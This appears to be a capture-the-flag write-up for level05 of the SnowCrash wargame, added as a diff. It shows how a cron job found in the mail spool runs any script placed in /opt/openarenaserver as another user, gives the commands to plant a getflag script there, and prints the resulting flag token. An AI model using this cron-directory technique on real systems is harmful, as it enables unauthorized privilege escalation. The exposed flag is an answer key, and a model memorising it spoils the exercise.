@@ -1,0 +1,26 @@
+when we connect to level05 we have a message
+that say you have new mail
+by searching on internet i found the linux path for mails
+in /var/spool/mail we have a file named level05 which contain the message:
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+it's a cron job that execute the openarenaserver script every 2 min
+
+the openarenaserver file contain:
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+the script execute all the files in /opt/openarenaserver and remove them after
+
+so we can create a script in /opt/openarenaserver that will execute the getflag command
+
+level05@SnowCrash:/var/spool/mail$ echo "getflag > /tmp/flag.txt" > /opt/openarenaserver/capture_flag.sh
+level05@SnowCrash:/var/spool/mail$ chmod +x /opt/openarenaserver/capture_flag.sh
+wait 2 min and cat /tmp/flag.txt
+level05@SnowCrash:/var/spool/mail$ cat /tmp/flag.txt
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+
